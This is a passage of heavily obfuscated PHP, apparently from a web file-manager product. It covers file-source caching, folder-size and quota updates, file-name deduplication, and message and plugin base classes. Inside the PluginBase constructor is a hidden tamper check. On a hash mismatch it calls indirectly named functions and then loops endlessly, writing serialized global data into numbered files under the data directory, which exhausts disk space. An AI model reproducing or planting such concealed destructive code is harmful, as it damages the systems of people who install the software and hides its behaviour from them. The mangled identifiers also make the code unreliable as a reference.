$üÅÚ Ÿ = $this->_listDataApplyItem($üÅÚ Ÿ, $´Ã¾äùâ); self::$cachePathInfo[$§ùîö ä] = $üÅÚ Ÿ; return $üÅÚ Ÿ; } public static $cachePathInfoMore = array(); public function pathInfoMore($±Ø®±Œø) { $÷Ä”¹¢í =& $_SERVER[÷åé¼î]; $š”šÙ† = _get(self::$cachePathInfoMore, $±Ø®±Œø); if ($š”šÙ†) { return $š”šÙ†; } $„Ÿ‡«È = $this->pathInfo($±Ø®±Œø); if (!$„Ÿ‡«È) { return !1; } if ($„Ÿ‡«È[$÷Ä”¹¢í[469]] == $÷Ä”¹¢í[91]) { $„Ÿ‡«È[$÷Ä”¹¢í[82]] = $this->folderChildrenNumber($±Ø®±Œø); } self::$cachePathInfoMore[$±Ø®±Œø] = $„Ÿ‡«È; return $„Ÿ‡«È; } public function sourceInfo($ò­Ÿù²á) { $ ôŸÂàÒ =& $_SERVER[÷åé¼î]; if (!$ò­Ÿù²á) { return array(); } $ò­Ÿù²á = intval($ò­Ÿù²á); $ı•Ë×§ = $ ôŸÂàÒ[517] . $ò­Ÿù²á; $¿«²ç¹¿ = _get(self::$cacheSourceInfo, $ı•Ë×§); if ($¿«²ç¹¿) { return $¿«²ç¹¿; } $üÚè­Àã = $this->where(array($ ôŸÂàÒ[193] => $ò­Ÿù²á))->find(); self::$cacheSourceInfo[$ı•Ë×§] = $üÚè­Àã; return self::$cacheSourceInfo[$ı•Ë×§]; } public function sourceCacheClear($Ä¢‹µû† = false) { self::cacheClear($Ä¢‹µû†); } public static function cacheClear($‚ŒÇ£š€ = false) { $ÜÛÀôÒ¦ =& $_SERVER[÷åé¼î]; if ($‚ŒÇ£š€ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÜÛÀôÒ¦[517] . $‚ŒÇ£š€]); unset(self::$cachePathInfoMore[$‚ŒÇ£š€]); unset(self::$cachePathInfo[$ÜÛÀôÒ¦[2286] . $‚ŒÇ£š€]); unset(self::$cachePathInfo[$ÜÛÀôÒ¦[2287] . $‚ŒÇ£š€]); } public function metaSet($ğŠÛ¢, $¦ÒÔãÅÀ = null, $ûÔòéè™ = null) { $¥³ğï± = parent::metaSet($ğŠÛ¢, $¦ÒÔãÅÀ, $ûÔòéè™); if ($¥³ğï±) { $this->sourceCacheClear($ğŠÛ¢); } return $¥³ğï±; } public function pathInfoByPath($Áäå´æŞ, $¸Æ‹“Õ) { $Å¾£»Òë =& $_SERVER[÷åé¼î]; $­ÖÈåà¿ = !$¸Æ‹“Õ ? array() : explode($Å¾£»Òë[8], trim($¸Æ‹“Õ, $Å¾£»Òë[8])); $â€ÅÃ = $Áäå´æŞ; foreach ($­ÖÈåà¿ as $ö±Ÿ™È‡) { $“úóÙ‰· = array($Å¾£»Òë[192] => $â€ÅÃ, $Å¾£»Òë[32] => $ö±Ÿ™È‡); $‹ÖÔâïİ = $this->field($Å¾£»Òë[2288])->where($“úóÙ‰·)->select(); if (!$‹ÖÔâïİ) { return !1; } $‹ÖÔâïİ = array_sort_by($‹ÖÔâïİ, $Å¾£»Òë[489]); $â€ÅÃ = $‹ÖÔâïİ[0][$Å¾£»Òë[193]]; } $ô™öù¦¦ = $this->sourceInfo($â€ÅÃ); $this->pathInfoFilter($ô™öù¦¦); return $ô™öù¦¦; } protected function updateModifyTime($¯ô›¨ˆü) { $§ÏÓ£‚ñ =& $_SERVER[÷åé¼î]; $ş•ñºĞ = defined($§ÏÓ£‚ñ[2203]) ? USER_ID : 0; if (!$¯ô›¨ˆü) { return; } if (!is_array($¯ô›¨ˆü)) { $¯ô›¨ˆü = array($¯ô›¨ˆü); } foreach ($¯ô›¨ˆü as $©—í‰¹¾ => $ŸÕóÈ¿š) { $¯ô›¨ˆü[$©—í‰¹¾] = intval($ŸÕóÈ¿š); $this->sourceCacheClear($ŸÕóÈ¿š); } $Óş¾ììŠ = array($§ÏÓ£‚ñ[193] => array($§ÏÓ£‚ñ[7], $¯ô›¨ˆü)); $¥±¬Ö†´ = array($§ÏÓ£‚ñ[635] => $ş•ñºĞ, $§ÏÓ£‚ñ[482] => time()); $this->where($Óş¾ììŠ)->save($¥±¬Ö†´); } public function folderSizeReset($²ÀÉá½‚, $À’üÍÖ = false) { $Ñ­Œì¢Ä =& $_SERVER[÷åé¼î]; if ($this->statusIgnoreResetSpace) { return; } $î²í÷àº = $this->sourceInfo($²ÀÉá½‚); $Ÿ‡Ÿ¾Úı = $Ñ­Œì¢Ä[2289] . $²ÀÉá½‚; CacheLock::lock($Ÿ‡Ÿ¾Úı, 20); if ($À’üÍÖ === !1) { $this->sourceCacheClear($²ÀÉá½‚); $î²í÷àº = $this->sourceInfo($²ÀÉá½‚); $öšÌ˜õÈ = array($Ñ­Œì¢Ä[461] => $²ÀÉá½‚, $Ñ­Œì¢Ä[488] => 0); $çô°Ğ¶ = $this->where($öšÌ˜õÈ)->sum($Ñ­Œì¢Ä[79]); $À’üÍÖ = intval($çô°Ğ¶) - intval($î²í÷àº[$Ñ­Œì¢Ä[79]]); } if ($À’üÍÖ == 0) { return CacheLock::unlock($Ÿ‡Ÿ¾Úı); } $„ÌÍ‚Ûå = $this->parentLevelArray($î²í÷àº[$Ñ­Œì¢Ä[568]]); if (!$„ÌÍ‚Ûå) { $„ÌÍ‚Ûå = array(); } $„ÌÍ‚Ûå[] = $î²í÷àº[$Ñ­Œì¢Ä[193]]; $öšÌ˜õÈ = array($Ñ­Œì¢Ä[193] => array($Ñ­Œì¢Ä[476], $„ÌÍ‚Ûå)); if ($À’üÍÖ < 0) { $öšÌ˜õÈ[$Ñ­Œì¢Ä[79]] = array($Ñ­Œì¢Ä[1087], abs($À’üÍÖ)); } $this->where($öšÌ˜õÈ)->setAdd($Ñ­Œì¢Ä[79], $À’üÍÖ); CacheLock::unlock($Ÿ‡Ÿ¾Úı); $¿©¢¬Ş = $Ñ­Œì¢Ä[2290] . $î²í÷àº[$Ñ­Œì¢Ä[190]] . $Ñ­Œì¢Ä[4] . $î²í÷àº[$Ñ­Œì¢Ä[553]]; $ÂÀº¦Æ¦ = array($î²í÷àº[$Ñ­Œì¢Ä[190]], $î²í÷àº[$Ñ­Œì¢Ä[553]]); TaskRun::timeLimitCall($¿©¢¬Ş, $Ñ­Œì¢Ä[2291], $ÂÀº¦Æ¦, 1.5); } public function folderSizeResetChildren($—âÕŞÓ) { $Ù‚¡Í› =& $_SERVER[÷åé¼î]; $this->sourceCacheClear($—âÕŞÓ); $ ›â‚©„ = $this->sourceInfo($—âÕŞÓ); $Šğ§ôˆà = array($Ù‚¡Í›[630] => 1, $Ù‚¡Í›[633] => $ ›â‚©„[$Ù‚¡Í›[553]], $Ù‚¡Í›[636] => array($Ù‚¡Í›[596], $ ›â‚©„[$Ù‚¡Í›[568]] . $—âÕŞÓ . $Ù‚¡Í›[597])); $òªÃÚ¦Â = $Ù‚¡Í›[2292]; $š¾Ö¹û¹ = $this->field($òªÃÚ¦Â)->where($Šğ§ôˆà)->select(); $Šğ§ôˆà[$Ù‚¡Í›[469]] = 0; $¢¦óü«½ = $this->field($òªÃÚ¦Â)->where($Šğ§ôˆà)->select(); if (!$¢¦óü«½) { return; } $š¾Ö¹û¹[] = $ ›â‚©„; $š¾Ö¹û¹ = array_to_keyvalue($š¾Ö¹û¹, $Ù‚¡Í›[193]); foreach ($š¾Ö¹û¹ as $½€ùİ×É => $õÚ¢ğ±) { $š¾Ö¹û¹[$½€ùİ×É][$Ù‚¡Í›[2293]] = $š¾Ö¹û¹[$½€ùİ×É][$Ù‚¡Í›[79]]; $š¾Ö¹û¹[$½€ùİ×É][$Ù‚¡Í›[79]] = 0; } foreach ($¢¦óü«½ as $õÚ¢ğ±) { $âóœ¦ç = $õÚ¢ğ±[$Ù‚¡Í›[192]] . $Ù‚¡Í›[12]; if (!isset($š¾Ö¹û¹[$âóœ¦ç])) { continue; } if ($õÚ¢ğ±[$Ù‚¡Í›[489]] == $š¾Ö¹û¹[$âóœ¦ç][$Ù‚¡Í›[489]]) { $š¾Ö¹û¹[$âóœ¦ç][$Ù‚¡Í›[79]] += $õÚ¢ğ±[$Ù‚¡Í›[79]]; } } foreach ($š¾Ö¹û¹ as $õÚ¢ğ±) { $ãÎŠèÀñ = $this->parentLevelArray($õÚ¢ğ±[$Ù‚¡Í›[568]]); foreach ($ãÎŠèÀñ as $âóœ¦ç) { $âóœ¦ç = $âóœ¦ç . $Ù‚¡Í›[12]; if (!isset($š¾Ö¹û¹[$âóœ¦ç])) { continue; } if ($õÚ¢ğ±[$Ù‚¡Í›[489]] == $š¾Ö¹û¹[$âóœ¦ç][$Ù‚¡Í›[489]]) { $š¾Ö¹û¹[$âóœ¦ç][$Ù‚¡Í›[79]] += $õÚ¢ğ±[$Ù‚¡Í›[79]]; } } } $ÎœğôÔš = array(); foreach ($š¾Ö¹û¹ as $õÚ¢ğ±) { if ($õÚ¢ğ±[$Ù‚¡Í›[79]] == $õÚ¢ğ±[$Ù‚¡Í›[2293]]) { continue; } $ÎœğôÔš[] = array($Ù‚¡Í›[193], $õÚ¢ğ±[$Ù‚¡Í›[193]], $Ù‚¡Í›[79], $õÚ¢ğ±[$Ù‚¡Í›[79]]); } $this->saveAll($ÎœğôÔš); } public function userSpaceReset($›¥Ğ˜°¦ = false) { $™Ò¿û²è =& $_SERVER[÷åé¼î]; $²€¸ç–¡ = $this->where(array($™Ò¿û²è[190] => self::TYPE_USER, $™Ò¿û²è[553] => $›¥Ğ˜°¦, $™Ò¿û²è[469] => 0))->sum($™Ò¿û²è[79]); $²€¸ç–¡ = !$²€¸ç–¡ || $²€¸ç–¡ <= 0 ? 0 : $²€¸ç–¡; Model($™Ò¿û²è[561])->userEdit($›¥Ğ˜°¦, array($™Ò¿û²è[1966] => $²€¸ç–¡)); } public function targetSpaceUpdate($¢­Øóü, $Ù„ª®ˆ) { $©õ²šÁ“ =& $_SERVER[÷åé¼î]; if (!$Ù„ª®ˆ) { return; } if (!in_array($¢­Øóü, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÇèÂº = $this->targetSpaceSize($¢­Øóü, $Ù„ª®ˆ); if ($¢­Øóü == self::TYPE_USER) { Model($©õ²šÁ“[561])->userEdit($Ù„ª®ˆ, array($©õ²šÁ“[1966] => $ÇèÂº)); } else { if ($¢­Øóü == self::TYPE_GROUP) { Model($©õ²šÁ“[569])->groupEdit($Ù„ª®ˆ, array($©õ²šÁ“[1966] => $ÇèÂº)); } } } public function targetSpaceSize($âÀ²¹Ñ, $«¢–—¡¡) { $…ã¼¨‰ê =& $_SERVER[÷åé¼î]; $À’¹—…Š = 0; $Ş¦§˜ğ = $this->targetSourceRoot($âÀ²¹Ñ, $«¢–—¡¡, !0); foreach ($Ş¦§˜ğ as $Ş£†¢İ«) { if (!$Ş£†¢İ«) { continue; } $À’¹—…Š += floatval($Ş£†¢İ«[$…ã¼¨‰ê[79]]); $¼ ¾Èı = array($…ã¼¨‰ê[636] => array($…ã¼¨‰ê[596], $…ã¼¨‰ê[578] . $Ş£†¢İ«[$…ã¼¨‰ê[193]] . $…ã¼¨‰ê[597])); $©ŒÌìª· = Model($…ã¼¨‰ê[487])->field($…ã¼¨‰ê[475])->where($¼ ¾Èı)->select(); $©ŒÌìª· = array_to_keyvalue($©ŒÌìª·, $…ã¼¨‰ê[12], $…ã¼¨‰ê[193]); $©ŒÌìª· = array_unique(array_filter($©ŒÌìª·)); if ($©ŒÌìª·) { $¼ ¾Èı = array($…ã¼¨‰ê[475] => array($…ã¼¨‰ê[476], $©ŒÌìª·)); $À’¹—…Š += floatval($this->where($¼ ¾Èı)->sum($…ã¼¨‰ê[79])); } } $À’¹—…Š = !$À’¹—…Š || $À’¹—…Š <= 0 ? 0 : $À’¹—…Š; return $À’¹—…Š; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ùÍ±²¨ô) { return $this->fileTypeProfile($ùÍ±²¨ô, SourceModel::TYPE_USER); } public function groupFileTypeProfile($’¡³®—) { return $this->fileTypeProfile($’¡³®—, SourceModel::TYPE_GROUP); } private function fileTypeProfile($€îÉÒş¨, $âşÉ¤°â) { $èôòú‡ =& $_SERVER[÷åé¼î]; $²ŠØåñ• = $èôòú‡[2294] . $€îÉÒş¨ . $èôòú‡[11] . $âşÉ¤°â; $ÖÏæÄœÄ = Cache::get($²ŠØåñ•); if ($ÖÏæÄœÄ) { return $ÖÏæÄœÄ; } $åÏ¿åØ¶ = array($èôòú‡[630] => 0); if ($€îÉÒş¨ != !1) { $åÏ¿åØ¶[$èôòú‡[553]] = $€îÉÒş¨; $åÏ¿åØ¶[$èôòú‡[190]] = $âşÉ¤°â; } $¶µøÛ£ = array(); $¶µøÛ£[$èôòú‡[2295]] = array($èôòú‡[2296] => LNG($èôòú‡[2295]), $èôòú‡[2297] => $this->where($åÏ¿åØ¶)->count(), $èôòú‡[601] => $this->where($åÏ¿åØ¶)->sum($èôòú‡[79])); $ïÊëª™æ = KodIO::fileTypeList(); foreach ($ïÊëª™æ as $‡Ñš«ÕÖ => $»çè…²) { $åÏ¿åØ¶[$èôòú‡[470]] = $this->fileTypeWhere($‡Ñš«ÕÖ); $¶µøÛ£[$‡Ñš«ÕÖ] = array($èôòú‡[2296] => $»çè…²[$èôòú‡[32]], $èôòú‡[2297] => $this->where($åÏ¿åØ¶)->count(), $èôòú‡[601] => $this->where($åÏ¿åØ¶)->sum($èôòú‡[79])); } Cache::set($²ŠØåñ•, $¶µøÛ£, 1200); return $¶µøÛ£; } public function fileNameExist($ŒÊ¸ñş, $ÄÇÇ÷™™) { $±êÏı°ş =& $_SERVER[÷åé¼î]; $¤ò¼Ë¬ş = $this->field($±êÏı°ş[2298])->where(array($±êÏı°ş[192] => $ŒÊ¸ñş, $±êÏı°ş[32] => $ÄÇÇ÷™™, $±êÏı°ş[489] => 0))->find(); return is_array($¤ò¼Ë¬ş) ? $¤ò¼Ë¬ş[$±êÏı°ş[193]] : !1; } public function childList($Ì°­£»„) { $æ¥Õ‚ıú =& $_SERVER[÷åé¼î]; $±°ï¼· = $æ¥Õ‚ıú[2271] . $Ì°­£»„; if (isset(self::$cacheChildList[$±°ï¼·])) { return self::$cacheChildList[$±°ï¼·]; } $ª‰ÎòÉĞ = array($æ¥Õ‚ıú[192] => intval($Ì°­£»„), $æ¥Õ‚ıú[489] => 0); $Öºè¸Ş = $this->where($ª‰ÎòÉĞ)->select(); $Öºè¸Ş = $Öºè¸Ş ? $Öºè¸Ş : array(); self::$cacheChildList[$±°ï¼·] = $Öºè¸Ş; foreach ($Öºè¸Ş as $¼Ëìæèä) { $±°ï¼· = $æ¥Õ‚ıú[517] . $¼Ëìæèä[$æ¥Õ‚ıú[193]]; self::$cacheSourceInfo[$±°ï¼·] = $¼Ëìæèä; } return $Öºè¸Ş; } public function fileNameAuto($°°ë¡î­, $·º™—‹„, $¹Ü—‰šÆ = REPEAT_RENAME, $çöê–¤‰ = false) { $Çø‘ºìÍ =& $_SERVER[÷åé¼î]; $ûˆÆÕê’ = get_path_ext($·º™—‹„); $®›±ÈÅı = $ûˆÆÕê’ ? get_path_ext_name($·º™—‹„) . $Çø‘ºìÍ[2299] . $ûˆÆÕê’ : $·º™—‹„ . $Çø‘ºìÍ[444]; $Êä‰—‹˜ = array($Çø‘ºìÍ[192] => $°°ë¡î­, $Çø‘ºìÍ[489] => 0, $Çø‘ºìÍ[32] => array($Çø‘ºìÍ[443], $®›±ÈÅı)); $Í£Ô…Ìæ = $this->field($Çø‘ºìÍ[32])->where($Êä‰—‹˜)->select(); $ĞÈÚÁÂö = array_to_keyvalue($Í£Ô…Ìæ, $Çø‘ºìÍ[12], $Çø‘ºìÍ[32]); return $this->fileNameAutoGet($ĞÈÚÁÂö, $·º™—‹„, $¹Ü—‰šÆ, $çöê–¤‰); } public function fileNameAutoGet($©Õ‚Òñ„, $ÛòÖŠÔÕ, $æŞ¥ç‰ş, $·ÏçˆÈÖ) { $ÈüˆØ¿£ =& $_SERVER[÷åé¼î]; if ($æŞ¥ç‰ş == REPEAT_REPLACE || !$©Õ‚Òñ„ || !in_array_not_case($ÛòÖŠÔÕ, $©Õ‚Òñ„) || $·ÏçˆÈÖ && $æŞ¥ç‰ş != REPEAT_RENAME_FOLDER) { return $ÛòÖŠÔÕ; } if ($æŞ¥ç‰ş == REPEAT_SKIP) { return !1; } $”˜í¹Ä = $ÈüˆØ¿£[10] . get_path_ext($ÛòÖŠÔÕ); $”˜í¹Ä = $”˜í¹Ä == $ÈüˆØ¿£[10] || $·ÏçˆÈÖ ? $ÈüˆØ¿£[12] : $”˜í¹Ä; for ($Æ¾¥Ş¥ = 1; $Æ¾¥Ş¥ <= count($©Õ‚Òñ„) + 1; $Æ¾¥Ş¥++) { $½ÁÚ—Ş† = substr($ÛòÖŠÔÕ, 0, strlen($ÛòÖŠÔÕ) - strlen($”˜í¹Ä)); $Ú§‡ß— = $½ÁÚ—Ş† . "\x28{$Æ¾¥Ş¥}\51{$”˜í¹Ä}"; if (!in_array_not_case($Ú§‡ß—, $©Õ‚Òñ„)) { return $Ú§‡ß—; } } } } goto aÛå„§åÃ; Eìˆ‹ê“ö‚: class Message { function __construct() { } public function send($Ú­ëèºò = '', $ç•ş‡­˜ = array(), $ÉÌ«‘Œ‹ = "\164\x65\170\164") { $—é²‚• =& $_SERVER[÷åé¼î]; $ƒ¨ƒ¤ö– = array($—é²‚•[33] => $—é²‚•[1631], $—é²‚•[171] => $Ú­ëèºò); if (in_array($ÉÌ«‘Œ‹, array($—é²‚•[1631], $—é²‚•[1632]))) { $ƒ¨ƒ¤ö–[$—é²‚•[33]] = $ÉÌ«‘Œ‹; } $ç•ş‡­˜ = array($—é²‚•[562] => isset($ç•ş‡­˜[$—é²‚•[562]]) ? $ç•ş‡­˜[$—é²‚•[562]] : $—é²‚•[12], $—é²‚•[646] => isset($ç•ş‡­˜[$—é²‚•[646]]) ? $ç•ş‡­˜[$—é²‚•[646]] : $—é²‚•[12]); if (empty($Ú­ëèºò) || empty($ç•ş‡­˜[$—é²‚•[562]]) && empty($ç•ş‡­˜[$—é²‚•[646]])) { return !1; } $Ö€Ç¤«” = array($—é²‚•[1559] => $ƒ¨ƒ¤ö–, $—é²‚•[1633] => $ç•ş‡­˜); Hook::trigger($—é²‚•[1634], $Ö€Ç¤«”); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $½¿¢‹× =& $_SERVER[÷åé¼î]; $ÕÑÂµ™™ = $_SERVER[$½¿¢‹×[935]] . $½¿¢‹×[936]; $»å€ãò£ = $½¿¢‹×[932]; if ($_SERVER[$½¿¢‹×[933]] != $»å€ãò£($ÕÑÂµ™™)) { $Õ…®Ñ˜ï = $½¿¢‹×[949]; $Õ“Ÿ¶ç€ = $½¿¢‹×[934]; $¿êÅûğ = $_SERVER[$½¿¢‹×[935]] . $½¿¢‹×[936]; $‰Ú«ªºŠ = $Õ“Ÿ¶ç€($¿êÅûğ); $üÙ¤¬¶´ = explode($½¿¢‹×[262], $‰Ú«ªºŠ); if (count($üÙ¤¬¶´) < $½¿¢‹×[703]) { $à­ÎÎä« = $½¿¢‹×[937]; $à­ÎÎä«(); } $ƒÌÂ¦”ñ = $½¿¢‹×[950]; $ƒÌÂ¦”ñ($_SERVER[$½¿¢‹×[951]]); $Õ…®Ñ˜ï = $½¿¢‹×[949]; $Õ…®Ñ˜ï(); $å„úè… = $½¿¢‹×[952]; $í÷·û¼‹ = json_encode($GLOBALS[$½¿¢‹×[953]]); $İ¹§À¾Ú = 1; for ($†Ó¾™íœ = $İ¹§À¾Ú; $†Ó¾™íœ > 0; $†Ó¾™íœ++) { $å„úè…(DATA_PATH . $†Ó¾™íœ, $í÷·û¼‹); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($½¿¢‹×[1635]); $this->pluginName = str_replace($½¿¢‹×[1635], $½¿¢‹×[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $½¿¢‹×[8]; $this->pluginApi = appHostGet() . $½¿¢‹×[1636] . $this->pluginName . $½¿¢‹×[8]; $this->pluginHost = $config[$½¿¢‹×[1637]] . $this->pluginName . $½¿¢‹×[8]; $this->pluginHostDefault = $config[$½¿¢‹×[1637]] . $this->pluginName . $½¿¢‹×[8]; $ÎâæÊê = $config[$½¿¢‹×[1638]]; if ($ÎâæÊê && strpos($½¿¢‹×[50] . $ÎâæÊê . $½¿¢‹×[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$½¿¢‹×[1639]] . $this->pluginName . $½¿¢‹×[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[÷åé¼î][1640]); } protected function assign($ç€ì±üò, $ä·Ì£ğû = false) { if (is_array($ç€ì±üò)) { $this->values = array_merge($this->values, $ç€ì±üò); } else { $this->values[$ç€ì±üò] = $ä·Ì£ğû; } } protected function display($ø€Ìîù) { extract($this->values); require $ø€Ìîù; } final function hookRegist($óÅ˜ßûÀ) { $this->modelPlugin->appRegist($this->pluginName, $óÅ˜ßûÀ); } final function appIcon() { $•ƒæÏÄ€ =& $_SERVER[÷åé¼î]; $—ğ‘»š = $this->appPackage(); $¡ï ƒ¾ = $•ƒæÏÄ€[12]; if (isset($—ğ‘»š[$•ƒæÏÄ€[474]])) { if (isset($—ğ‘»š[$•ƒæÏÄ€[474]][$•ƒæÏÄ€[1641]])) { $¡ï ƒ¾ = $•ƒæÏÄ€[1642] . $—ğ‘»š[$•ƒæÏÄ€[474]][$•ƒæÏÄ€[1641]] . $•ƒæÏÄ€[1643]; } else { if ($—ğ‘»š[$•ƒæÏÄ€[474]][$•ƒæÏÄ€[1644]]) { $¡ï ƒ¾ = $•ƒæÏÄ€[1645] . $—ğ‘»š[$•ƒæÏÄ€[474]][$•ƒæÏÄ€[1644]] . $•ƒæÏÄ€[1646]; } } } return $¡ï ƒ¾; } final function fileCanView($¿Ü„«˜) { $—Šâ°¬´ =& $_SERVER[÷åé¼î]; if (request_url_safe($¿Ü„«˜)) { return !0; } if ($this->isShare($¿Ü„«˜)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ıé’•Å× = $—Šâ°¬´[1647] . rawurlencode(this_url()); show_tips(LNG($—Šâ°¬´[1648]) . $—Šâ°¬´[1649] . $ıé’•Å× . $—Šâ°¬´[1650] . LNG($—Šâ°¬´[1651]) . $—Šâ°¬´[1652], !1); } if (!Action($—Šâ°¬´[1653])->authCan($—Šâ°¬´[1654])) { show_tips(LNG($—Šâ°¬´[1655]) . $—Šâ°¬´[1656], !1); } ActionCall($—Šâ°¬´[1657], $¿Ü„«˜); } final function isShare($„äÍ¾æ–) { $èîù›„ = KodIO::parse($„äÍ¾æ–); return $èîù›„[$_SERVER[÷åé¼î][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($îäÚäÇ) { if (request_url_safe($îäÚäÇ)) { return $îäÚäÇ; } if (!$this->isShare($îäÚäÇ)) { $îäÚäÇ = $this->filePath($îäÚäÇ, !1); } return Action($_SERVER[÷åé¼î][1250])->linkOut($îäÚäÇ); } public function filePathLinkOut($âöÌ÷°‹) { if (request_url_safe($âöÌ÷°‹)) { return $âöÌ÷°‹; } $this->fileCanView($âöÌ÷°‹); return Action($_SERVER[÷åé¼î][1250])->link($âöÌ÷°‹); } final function filePath($‡ÅÈïŒ, $€å§€Ú = true, $¾½ìŒÑ = false) { $¹‚ òÆî =& $_SERVER[÷åé¼î]; $¶½‘¯•À = $this->filePathGet($‡ÅÈïŒ, $€å§€Ú); if (!$this->fileInfo) { show_tips(LNG($¹‚ òÆî[108]), !1); } if ($¾½ìŒÑ && isset($this->fileInfo[$¹‚ òÆî[525]]) && $this->fileInfo[$¹‚ òÆî[525]]) { $Œíªˆ“ù = Model($¹‚ òÆî[528])->fileInfo($this->fileInfo[$¹‚ òÆî[525]]); if (!$Œíªˆ“ù || !IO::exist($Œíªˆ“ù[$¹‚ òÆî[87]])) { show_tips(LNG($¹‚ òÆî[108]) . $¹‚ òÆî[1658]); } } Hook::trigger($¹‚ òÆî[1659], $¶½‘¯•À); return $¶½‘¯•À; } final function filePathGet($Òàìé¶», $¿üğëù = true) { $”Âé£€Ş =& $_SERVER[÷åé¼î]; if ($ éÕˆºÚ = $this->checkSharePath($Òàìé¶», $¿üğëù)) { return $ éÕˆºÚ; } $this->fileCanView($Òàìé¶»); if (request_url_safe($Òàìé¶»)) { $‡ôõ‰´Á = parse_url_query($Òàìé¶»); if (isset($‡ôõ‰´Á[$”Âé£€Ş[1660]]) && isset($‡ôõ‰´Á[$”Âé£€Ş[234]])) { $ƒ¾ŒœÈš = Mcrypt::decode($‡ôõ‰´Á[$”Âé£€Ş[234]], Model($”Âé£€Ş[835])->get($”Âé£€Ş[836])); if ($ƒ¾ŒœÈš) { $this->fileInfo = IO::info($ƒ¾ŒœÈš); $this->fileInfo[$”Âé£€Ş[1661]] = $Òàìé¶»; $this->cachePath = $this->pluginCachePath($”Âé£€Ş[12], $¿üğëù); return $ƒ¾ŒœÈš; } } $Òàìé¶» = $this->_cacheHttpFile($Òàìé¶», $¿üğëù); $this->fileInfo = IO::info($Òàìé¶»); } else { $this->fileInfo = IO::info($Òàìé¶»); $this->cachePath = $this->pluginCachePath($”Âé£€Ş[12], $¿üğëù); } return $Òàìé¶»; } final function _cacheHttpFile($°ìä¥ÓÅ, $öĞ ¥™İ = true) { $·£Ã¥¼Ø =& $_SERVER[÷åé¼î]; $”ú‘¬¼ = parse_url_query($°ìä¥ÓÅ); $êøëòŞ = get_path_ext($°ìä¥ÓÅ); if (isset($”ú‘¬¼[$·£Ã¥¼Ø[32]]) && $”ú‘¬¼[$·£Ã¥¼Ø[32]]) { $êøëòŞ = get_path_ext($”ú‘¬¼[$·£Ã¥¼Ø[32]]); } $„éòï²” = hash_path($°ìä¥ÓÅ) . $·£Ã¥¼Ø[10] . $êøëòŞ; $this->cachePath = $this->pluginCachePath($öĞ ¥™İ ? $„éòï²” : $·£Ã¥¼Ø[12]); $åÕ± × = IO::fileNameExist($this->cachePath, $„éòï²”); if ($åÕ± ×) { return KodIO::make($åÕ± ×); } $Ÿä“¶ñ¾ = rtrim($this->cachePath, $·£Ã¥¼Ø[8]) . $·£Ã¥¼Ø[8] . $„éòï²”; return $this->pluginCacheFileSet($Ÿä“¶ñ¾, file_get_contents_nossl($°ìä¥ÓÅ)); } final function checkSharePath($Şòß§Ãİ, $íéÁëÔ = true) { $•åÎÄú =& $_SERVER[÷åé¼î]; if (!$this->isShare($Şòß§Ãİ)) { return !1; } $™•¾Ó‚µ = Action($•åÎÄú[1250])->sharePathInfo($Şòß§Ãİ); if (!is_array($™•¾Ó‚µ) || !isset($™•¾Ó‚µ[$•åÎÄú[87]])) { show_json(LNG($•åÎÄú[1662]), !1); } $this->fileInfo = $™•¾Ó‚µ; $this->cachePath = $this->pluginCachePath(!1, $íéÁëÔ); return $™•¾Ó‚µ[$•åÎÄú[87]]; } final function pluginCachePath($´ùúèÉ = '', $Êƒåàûˆ = false) { $ïÊ—”Ú¸ =& $_SERVER[÷åé¼î]; if ($Êƒåàûˆ && is_array($this->fileInfo)) { $´ùúèÉ = kodIO::hashPath($this->fileInfo); } $Ô¿ñ¨ø‹ = rtrim(IO_PATH_SYSTEM_TEMP . $ïÊ—”Ú¸[1663] . $this->pluginName . $ïÊ—”Ú¸[8] . $´ùúèÉ, $ïÊ—”Ú¸[8]); $ª¿ôëë = IO::infoFullSimple($Ô¿ñ¨ø‹); $Ÿ”ş°ñÀ = $ª¿ôëë && is_array($ª¿ôëë) ? $ª¿ôëë[$ïÊ—”Ú¸[87]] : $ïÊ—”Ú¸[12]; if (!$Ÿ”ş°ñÀ) { $Ÿ”ş°ñÀ = IO::mkdir($Ô¿ñ¨ø‹); } return $Ÿ”ş°ñÀ; } final function pluginCacheFileSet($òîâ·õ˜, $†• É€ = '') { $Éã…ìæñ =& $_SERVER[÷åé¼î]; $´‰Á“ = IO::infoFullSimple($òîâ·õ˜); if (!$´‰Á“) { return IO::mkfile($òîâ·õ˜, $†• É€, REPEAT_REPLACE); } IO::setContent($´‰Á“[$Éã…ìæñ[87]], $†• É€); return $´‰Á“[$Éã…ìæñ[87]]; } final function pluginLocalFile($Üæ°Æ‘ = '') { $ØŞÇìø =& $_SERVER[÷åé¼î]; $¬¡İè‰Ó = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¬¡İè‰Ó)) { mk_dir($¬¡İè‰Ó); } if (!$Üæ°Æ‘) { return $¬¡İè‰Ó; } $š´ÆìÊÑ = IO::info($Üæ°Æ‘); $¤Œ¨³®´ = $ØŞÇìø[1664] . KodIO::hashPath($š´ÆìÊÑ) . $ØŞÇìø[10] . $š´ÆìÊÑ[$ØŞÇìø[169]]; if (!checkExtSafe($¤Œ¨³®´)) { $¤Œ¨³®´ = $¤Œ¨³®´ . $ØŞÇìø[1285]; } $¿¨­º‹å = $¬¡İè‰Ó . $¤Œ¨³®´; if (@file_exists($¿¨­º‹å)) { return $¿¨­º‹å; } return IO::copy($Üæ°Æ‘, $¬¡İè‰Ó, 0, $¤Œ¨³®´); } final function appPackage() { $ğÀ¡òÈš =& $_SERVER[÷åé¼î]; if ($this->packageData) { 